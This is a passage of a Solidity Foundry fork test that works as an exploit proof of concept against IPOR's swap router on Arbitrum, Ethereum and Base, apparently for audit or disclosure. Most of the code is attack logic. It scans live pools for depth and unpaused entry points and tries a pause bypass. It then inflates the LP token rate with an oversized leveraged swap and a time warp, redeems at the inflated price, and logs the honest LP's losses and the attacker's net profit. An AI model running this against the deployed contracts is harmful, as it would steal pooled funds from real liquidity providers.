                            p6 ? "PAUSED" : "open  ",
                            "   5arg ",
                            p5 ? "PAUSED" : "open  "
                        )
                    );
                    console2.logBytes4(s6);
                    console2.logBytes4(s5);
                }
            }
        }

        console2.log("");
        console2.log("liquidity / close entry points of the pools under test:");
        for (uint256 i; i < ps.length; i++) {
            console2.log(ps[i].name);
            console2.log("   provide paused", _isPaused(_provideSel(ps[i])) ? "YES" : "no");
            console2.log("   redeem  paused", _isPaused(_redeemSel(ps[i])) ? "YES" : "no");
        }
        for (uint256 i; i < ps.length; i++) {
            (string memory cv,) = _routed(_closeSel(ps[i]));
            console2.log(string.concat("   closeSwaps ", ps[i].tag, " -> ", cv));
        }

        // ---- pause bypass attempt: call the open-swap service directly.
        // The router delegatecalls the service, so the message-signer slot it
        // reads lives in router storage; in the service's own storage it is 0.
        console2.log("");
        console2.log("== pause bypass via the raw service contract");
        Pool memory p = ps[0];
        if (p.openSwapService != address(0)) {
            address owner = router.owner();
            uint256 lev = 10e18;
            RiskInputs memory ri = _risk(lev);
            ri.signature = _sign(ri, p.asset, 2, DIR_RECEIVE_FIXED);
            deal(p.asset, attacker, _fromWad(100e18, p.decimals) + 10 ** p.decimals);
            vm.startPrank(attacker);
            IERC20Like(p.asset).approve(address(router), type(uint256).max);
            IERC20Like(p.asset).approve(p.openSwapService, type(uint256).max);
            (bool ok, bytes memory ret) = p.openSwapService.call(
                _openCalldata(p, 2, _preferInputAsset(p), DIR_RECEIVE_FIXED, _fromWad(100e18, p.decimals), lev, ri)
            );
            vm.stopPrank();
            if (ok) {
                console2.log("   ACCEPTED -> pause bypassed, finding is live");
            } else {
                console2.log("   rejected, as the service's own signer slot is empty");
                _logReason(ret);
            }
            // same call, but with the signer the router uses - still must fail
            // because the slot being read is the service's, not the router's.
            console2.log("   (router signer is set:", owner, ")");
        }
    }

    // ============================================================ 4. every chain
    /// @notice one run, all three deployments: how big is each pool and which
    ///         entry points are still open. skips a chain whose RPC is not set.
    function test_4_all_chains() public {
        _chainProbe("arbitrum", "ARB_RPC");
        _chainProbe("ethereum", "ETH_RPC");
        _chainProbe("base", "BASE_RPC");
    }

    function _chainProbe(string memory name, string memory key) internal {
        (string memory rpc, bool ok) = _envS(key);
        if (!ok) {
            console2.log(string.concat(name, ": ", key, " not set, skipped"));
            return;
        }
        vm.createSelectFork(rpc);
        Pool[] memory ps = _pools();
        console2.log("");
        console2.log(string.concat("===== ", name));
        console2.log("chainid", block.chainid, "block", block.number);
        console2.log("router", address(router));
        address ownerSr = address(0);
        try router.owner() returns (address o) {
            ownerSr = o;
        } catch {
            console2.log("  !! router.owner() reverted - is this address still the router?");
        }
        console2.log("owner ", ownerSr);
        for (uint256 i; i < ps.length; i++) {
            Pool memory p = ps[i];
            (uint256 idle, uint256 vault) = _cash(p);
            (uint256 d,) = _depth(p);
            console2.log(p.name);
            console2.log("  LP balance (wad)", d);
            console2.log("  LP balance USD  ", _usd(p, d));
            console2.log("  cash idle (wad) ", idle);
            console2.log("  cash vault (wad)", vault);
            for (uint256 t; t < 3; t++) {
                bytes4 rf = _openSel(p.assetTag, t, true, DIR_RECEIVE_FIXED);
                bytes4 pf = _openSel(p.assetTag, t, true, DIR_PAY_FIXED);
                console2.log(
                    string.concat(
                        "  ",
                        _tenorTag(t),
                        "  receiveFixed ",
                        _isPaused(rf) ? "PAUSED" : "OPEN",
                        "   payFixed ",
                        _isPaused(pf) ? "PAUSED" : "OPEN"
                    )
                );
            }
            console2.log("  provideLiquidity", _isPaused(_provideSel(p)) ? "PAUSED" : "OPEN");
            console2.log("  redeem          ", _isPaused(_redeemSel(p)) ? "PAUSED" : "OPEN");
        }
    }

    // ============================================================ 1. attack
    function test_1_attack() public {
        Pool[] memory ps = _pools();

        // ---- test-only: point the risk-indicator verifier at our key
        address owner = router.owner();
        vm.prank(owner);
        try router.setMessageSigner(signer) {} catch {
            console2.log("!! setMessageSigner reverted");
            revert("blocked: no risk-indicator signer");
        }
        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
        console2.log("     risk-indicator payload any user can fetch from IPOR's API.");
        console2.log("");

        // ---- order the pools: TARGET first (if set), otherwise deepest first.
        //      A pool whose open-swap selectors are all paused is skipped, and the
        //      next pool is tried, because the pause map is per-selector, not
        //      per-protocol: measured at block 26,310,577 Arbitrum USDC is closed
        //      while Arbitrum wstETH (5-arg) and Ethereum USDC/USDT/DAI are open.
        uint256 n = ps.length;
        uint256[] memory order = new uint256[](n);
        for (uint256 i; i < n; i++) order[i] = i;
        for (uint256 i = 1; i < n; i++) {
            uint256 key = order[i];
            (uint256 kd,) = _depth(ps[key]);
            uint256 kusd = _usd(ps[key], kd);
            uint256 j = i;
            while (j > 0) {
                (uint256 jd,) = _depth(ps[order[j - 1]]);
                if (_usd(ps[order[j - 1]], jd) >= kusd) break;
                order[j] = order[j - 1];
                j--;
            }
            order[j] = key;
        }
        (string memory tgt, bool hasTgt) = _envS("TARGET");
        if (hasTgt) {
            for (uint256 i; i < n; i++) {
                if (_eq(ps[order[i]].tag, tgt) && i > 0) {
                    uint256 tmp = order[0];
                    order[0] = order[i];
                    order[i] = tmp;
                }
            }
        }

        bool done;
        for (uint256 k; k < n && !done; k++) {
            console2.log("==================================================");
            console2.log("attempt", k + 1);
            console2.log("  of pools:", n);
            console2.log("  ->", ps[order[k]].name);
            done = _attackOn(ps[order[k]]);
            if (!done) {
                console2.log("  pool skipped: no open swap path on this block");
                console2.log("");
            }
        }
        require(done, "no pool on this chain had an open swap path");
    }



    function _attackOn(Pool memory p) internal returns (bool success) {

        console2.log("target:", p.name);
        console2.log("block", block.number);

        (uint256 idle0, uint256 vault0) = _cash(p);
        (uint256 depth0, string memory depthSrc) = _depth(p);
        uint256 rate0 = _rate(p);
        uint256 supply0 = IERC20Like(p.ipToken).totalSupply();
        console2.log("depth0 (wad)", depth0);
        console2.log("  depth source", depthSrc);
        console2.log("  depth0 USD  ", _usd(p, depth0));
        console2.log("idle0  (wad)", idle0);
        console2.log("vault0 (wad)", vault0);
        {
            address st = _ammStorageOf(p);
            if (st != address(0)) {
                try IAmmStorageLike(st).getBalance() returns (AmmBalance memory sb) {
                    console2.log("  storage liquidityPool (wad)", sb.liquidityPool);
                    console2.log("  storage vault (wad)        ", sb.vault);
                } catch {}
            }
        }
        console2.log("ipToken supply", supply0);
        console2.log("rate0", rate0);

        uint256 atkLpWad = _envOr("ATK_LP", depth0 / 2);
        uint256 honestWad = _envOr("HONEST", depth0 / 4);
        uint256 totalWad = _envOr("TOTAL", depth0 / 2);
        uint256 lev = _envOr("LEV", 1000e18);
        uint256 wantTenor = _envOr("TENOR", 90);
        uint256 chunkCount = _envOr("CHUNKS", 20);
        if (chunkCount == 0) chunkCount = 20;

        uint256 tenorIdx = wantTenor >= 90 ? 2 : (wantTenor >= 60 ? 1 : 0);
        uint256 days_ = _envOr("DAYS", wantTenor);
        if (days_ == 0) days_ = 90;

        console2.log("plan: LP in (attacker)", atkLpWad);
        console2.log("plan: LP in (honest)  ", honestWad);
        console2.log("plan: swap collateral ", totalWad);
        console2.log("plan: leverage        ", lev);
        console2.log("plan: tenor (days)    ", _tenorTag(tenorIdx));
        console2.log("plan: days held       ", days_);
        console2.log("");


        // ---- fund: exactly what the plan needs, so that
        //      net = balanceOf(attacker) - float0 is a real profit, not an
        //      artefact of an over-funding deal().
        uint256 atkBudgetWad = atkLpWad + totalWad + totalWad / 20 + depth0 / 100 + 1e18;
        deal(p.asset, attacker, _fromWad(atkBudgetWad, p.decimals) + 10 ** p.decimals);
        deal(p.asset, honest, _fromWad(honestWad, p.decimals) + 10 ** p.decimals);
        uint256 float0 = IERC20Like(p.asset).balanceOf(attacker);
        uint256 honestFloat0 = IERC20Like(p.asset).balanceOf(honest);
        console2.log("attacker float (wad)", _wad(float0, p.decimals));
        console2.log("honest   float (wad)", _wad(honestFloat0, p.decimals));

        uint256 spent;

        // ---- 1. honest LP joins first (the victim)
        uint256 honestIp;
        if (honestWad > 0) {
            vm.startPrank(honest);
            IERC20Like(p.asset).approve(address(router), type(uint256).max);
            (bool hok, bytes memory hret) = address(router).call(
                abi.encodeWithSelector(_provideSel(p), honest, _fromWad(honestWad, p.decimals))
            );
            vm.stopPrank();
            if (hok) {
                honestIp = IERC20Like(p.ipToken).balanceOf(honest);
                console2.log("honest ipTokens", honestIp);
            } else {
                console2.log("honest LP entry failed");
                _logReason(hret);
            }
        }

        // ---- 2. attacker becomes an LP
        uint256 atkLp = atkLpWad;
        uint256 ipBal;
        for (uint256 i; i < 4; i++) {
            uint256 amt = _fromWad(atkLp, p.decimals);
            if (amt == 0) break;
            vm.startPrank(attacker);
            IERC20Like(p.asset).approve(address(router), type(uint256).max);
            (bool ok, bytes memory ret) = address(router).call(
                abi.encodeWithSelector(_provideSel(p), attacker, amt)
            );
            vm.stopPrank();
            if (ok) {
                spent += amt;
                console2.log("attacker provided liquidity (wad)", atkLp);
                break;
            }
            console2.log("provideLiquidity failed at (wad):", atkLp);
            _logReason(ret);
            atkLp /= 2;
        }
        ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
        if (ipBal == 0) return false;
        console2.log("attacker ipTokens", ipBal);
        console2.log("rate after LP entries", _rate(p));

        // ---- 3. open one oversized swap.
        //      The AMM prices BOTH directions against the trader once the swap
        //      is big enough (receive-fixed: index - demandSpread, pay-fixed:
        //      index + demandSpread), so the phantom LP gain appears on either
        //      side. Try receive-fixed first, then pay-fixed; within a direction
        //      try the requested tenor, then the other two; within a tenor try the
        //      chain's arity, then the legacy one. Paused entry points are skipped
        //      up front so a pause shows up as an honest "no path" instead of a
        //      pile of reverts.
        uint256 swapId;
        bool opened;
        uint256 usedTenor = tenorIdx;
        uint256 usedDir = DIR_RECEIVE_FIXED;
        uint8[2] memory dirOrder = [DIR_RECEIVE_FIXED, DIR_PAY_FIXED];
        for (uint256 di; di < 2 && !opened; di++) {
            uint256 dir = dirOrder[di];
            for (uint256 tr; tr < 3 && !opened; tr++) {
                uint256 t = (tenorIdx + tr) % 3;
                uint256 cand = totalWad;
                for (uint256 shrink; shrink < 6 && !opened; shrink++) {
                    if (cand == 0) break;
                    RiskInputs memory ri = _risk(lev);
                    ri.signature = _sign(ri, p.asset, t, dir);
                    uint256 amt = _fromWad(cand, p.decimals);
                    bool preferInput = _preferInputAsset(p);
                    for (uint8 v; v < 2 && !opened; v++) {
                        bool withInput = (v == 0) == preferInput;
                        bytes4 sel = _openSel(p.assetTag, t, withInput, dir);
                        if (_isPaused(sel)) continue;
                        vm.startPrank(attacker);
                        (bool ok, bytes memory ret) = address(router).call(
                            _openCalldata(p, t, withInput, dir, amt, lev, ri)
                        );
                        vm.stopPrank();
                        if (ok) {
                            swapId = abi.decode(ret, (uint256));
                            spent += amt;
                            opened = true;
                            usedTenor = t;
                            usedDir = dir;
                            console2.log(
                                string.concat(
                                    "swap opened: ",
                                    dir == DIR_RECEIVE_FIXED ? "receiveFixed" : "payFixed",
                                    " ",
                                    _tenorTag(t),
                                    " ",
                                    withInput ? "6arg" : "5arg"
                                )
                            );
                            console2.log("  collateral used (wad)", cand);
                            break;
                        }
                        console2.log("  open failed at (wad):", cand);
                        console2.logBytes4(sel);
                        _logReason(ret);
                    }
                    cand /= 2;
                }
            }
        }
        if (!opened) {
            return false;
        }

        console2.log("swapId", swapId);
        console2.log("swap tenor used", _tenorTag(usedTenor));
        console2.log("rate after swap", _rate(p));
        (uint256 depthSwap,) = _depth(p);
        console2.log("LP balance after swap (wad)", depthSwap);
        address swapStorage = _ammStorageOf(p);
        if (swapStorage != address(0)) {
            try IAmmStorageSwap(swapStorage).getSwap(uint8(usedDir), swapId) returns (SwapData memory sw) {
                console2.log("  swap.collateral (wad)", sw.collateral);
                console2.log("  swap.notional   (wad)", sw.notional);
                console2.log("  swap.ibtQty     (wad)", sw.ibtQuantity);
                console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
            } catch {}
        }

        // ---- 4. time passes: ibt price accrues, SOAP goes negative, unclamped
        vm.warp(block.timestamp + days_ * 1 days);
        uint256 rate1 = _rate(p);
        (uint256 depth1,) = _depth(p);
        uint256 supply1 = IERC20Like(p.ipToken).totalSupply();
        uint256 fairRate = supply1 > 0 ? (depth1 * 1e18) / supply1 : 0;
        console2.log("");
        console2.log("== after days held:", days_);
        console2.log("  rate1                        ", rate1);
        console2.log("  rate1/rate0 (x1e18)          ", rate0 == 0 ? 0 : (rate1 * 1e18) / rate0);
        console2.log("  fair rate (LP balance/supply)", fairRate);
        console2.log("  phantom inflation x1000      ", fairRate == 0 ? 0 : ((rate1 > fairRate ? rate1 - fairRate : 0) * 1000) / fairRate);
        console2.log("  LP balance (wad)             ", depth1);
        console2.log("  ipToken supply               ", supply1);

        // ---- 5. attacker redeems at the inflated price
        vm.startPrank(attacker);
        uint256 chunk = ipBal / chunkCount;
        if (chunk == 0) chunk = 1;
        uint256 attempts;
        while (ipBal > 0 && attempts < 40) {
            attempts++;
            uint256 c = chunk > ipBal ? ipBal : chunk;
            (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), attacker, c));
            if (rok) {
                ipBal -= c;
            } else {
                chunk /= 2;
                if (chunk == 0) break;
            }
        }
        vm.stopPrank();
        uint256 atkAsset = IERC20Like(p.asset).balanceOf(attacker);
        console2.log("");
        console2.log("== attacker redemption");
        console2.log("  ipTokens left", ipBal);
        console2.log("  assets after redemption (wad)", _wad(atkAsset, p.decimals));
        console2.log("  rate after redemption", _rate(p));

        // ---- 6. the honest LP tries to leave the pool
        uint256 honestClaim;
        uint256 honestGot;
        if (honestIp > 0) {
            uint256 rateNow = _rate(p);
            honestClaim = (honestIp * rateNow) / 1e18;
            uint256 before = IERC20Like(p.asset).balanceOf(honest);
            uint256 hLeft = honestIp;
            uint256 hChunk = hLeft / chunkCount;
            if (hChunk == 0) hChunk = 1;
            uint256 hAttempts;
            vm.startPrank(honest);
            while (hLeft > 0 && hAttempts < 40) {
                hAttempts++;
                uint256 c = hChunk > hLeft ? hLeft : hChunk;
                (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), honest, c));
                if (rok) {
                    hLeft -= c;
                } else {
                    hChunk /= 2;
                    if (hChunk == 0) break;
                }
            }
            vm.stopPrank();
            honestGot = IERC20Like(p.asset).balanceOf(honest) - before;
            console2.log("");
            console2.log("== honest LP exit");
            console2.log("  ipTokens redeemed    ", honestIp - hLeft);
            console2.log("  ipTokens stuck       ", hLeft);
            console2.log("  claim at rate (wad)  ", honestClaim);
            console2.log("  actually received(wad)", _wad(honestGot, p.decimals));
            console2.log("  claim USD            ", _usd(p, honestClaim));
            console2.log("  received USD         ", _usd(p, _wad(honestGot, p.decimals)));
        }

        // ---- 7. the abandoned swap cannot be closed any more
        uint256[] memory pf = new uint256[](usedDir == DIR_PAY_FIXED ? 1 : 0);
        uint256[] memory rf = new uint256[](usedDir == DIR_RECEIVE_FIXED ? 1 : 0);
        if (usedDir == DIR_PAY_FIXED) pf[0] = swapId;
        else rf[0] = swapId;
        RiskInputs memory rc = _risk(lev);
        rc.signature = _sign(rc, p.asset, usedTenor, usedDir);
        CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
        bytes4 closeSel = _closeSel(p);
        vm.startPrank(attacker);
        (bool cok, bytes memory cret) = address(router).call(abi.encodeWithSelector(closeSel, attacker, pf, rf, cri));
        vm.stopPrank();
        uint256 left = IERC20Like(p.asset).balanceOf(attacker);
        console2.log("");
        console2.log("== close attempt after the drain");
        if (cok) {
            console2.log("  close SUCCEEDED: collateral recovered (wad)", _wad(left, p.decimals));
        } else {
            console2.log("  close FAILED: the treasury cannot fund settlement");
            _logReason(cret);
        }

        // ---- 8. result
        (uint256 idle2, uint256 vault2) = _cash(p);
        (uint256 depth2,) = _depth(p);
        console2.log("");
        console2.log("== result");
        console2.log("  attacker assets out (wad)", _wad(left, p.decimals));
        console2.log("  attacker float  in (wad)", _wad(float0, p.decimals));
        console2.log("  spent on LP+swap   (wad)", spent);
        console2.log("  treasury idle after (wad)", idle2);
        console2.log("  vault after         (wad)", vault2);
        console2.log("  LP balance after    (wad)", depth2);
        console2.log("  LP balance after USD", _usd(p, depth2));
        console2.log("  redemption capacity USD", _usd(p, idle2 + vault2));
        uint256 net = left > float0 ? left - float0 : 0;
        uint256 neg = left > float0 ? 0 : float0 - left;
        if (net > 0) {
            console2.log("  NET PROFIT (wad)", _wad(net, p.decimals));
            console2.log("  NET PROFIT USD  ", _usd(p, _wad(net, p.decimals)));
        } else {
            console2.log("  NET LOSS (wad)", _wad(neg, p.decimals));
            console2.log("  NET LOSS USD", _usd(p, _wad(neg, p.decimals)));
        }

        // A swap did open, so this pool was reachable even if the accounting
        // made the attack unprofitable. Returning false here would have sent the
        // loop on to the next pool and then aborted with "no open swap path".
        return true;
    }
}
